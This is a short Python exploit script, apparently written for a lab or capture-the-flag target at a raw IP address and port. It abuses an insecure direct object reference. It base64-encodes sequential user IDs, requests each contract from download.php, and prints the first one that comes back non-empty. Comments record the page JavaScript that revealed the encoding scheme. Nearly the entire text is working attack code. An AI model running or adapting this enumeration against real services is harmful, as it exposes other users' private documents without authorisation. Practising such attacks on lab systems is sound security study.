import requests
import base64

url = "http://139.59.176.158:30365"

session = requests.Session()

# r = session.get(url + '/contracts.php')
# found a JS file
  # <script>
  #   function downloadContract(uid) {
  #     window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
  #   }
  # </script>

# print(r.text)
def encrypt(uid):
	return base64.b64encode(uid.encode())
	# not need to make url encode as request library will make by default

for i in range(1, 21):
	params = {
		"contract": encrypt(str(i))
	}
	r = session.get(url + '/download.php', params=params)
	print(f"[!] Trying {r.url}")
	if r.headers['Content-Length'] != "0":
		print("="*35)
		print(f"[+] {r.text}")
		print("="*35)
		break
	